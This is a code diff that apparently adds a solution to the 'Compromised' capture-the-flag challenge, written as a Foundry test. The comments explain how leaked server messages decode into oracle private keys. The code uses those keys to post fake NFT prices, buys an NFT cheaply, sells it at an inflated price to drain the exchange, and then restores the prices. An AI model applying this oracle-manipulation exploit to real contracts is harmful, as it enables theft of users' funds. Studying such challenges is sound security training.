@@ -77,6 +77,46 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+        // There is a hint in the introduction, something is compromised
+        // and the contract is dependant of an Oracle to determine the price
+        // of the NFTs. The messages from the server can be converted from Hex to ASCII.
+        // It seems to be in base64 and by decoding the base64.
+        // it reveals 32 bytes long private keys.
+        // By using the vm.addr(privateKey) of foundry, it outputs 2 addresses
+        // that are used as sources.
+        // Hence, it is possible to modify the prices for this sources and impact
+        // the price of NFTs.
+
+        // Modify Oracle prices for NFTs to be cheap
+        vm.startPrank(vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48));
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+
+        changePrank(vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9));
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        // Buy one NFT
+        changePrank(address(attacker));
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+        exchange.token().approve(address(exchange), tokenId);
+
+        // Modify Oracle prices for NFTs to be very expensive
+        changePrank(vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48));
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether);
+
+        changePrank(vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9));
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether);
+
+        // Sell the NFT
+        changePrank(address(attacker));
+        exchange.sellOne(tokenId);
+
+        // Change back prices to orginal price
+        changePrank(vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48));
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        changePrank(vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9));
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
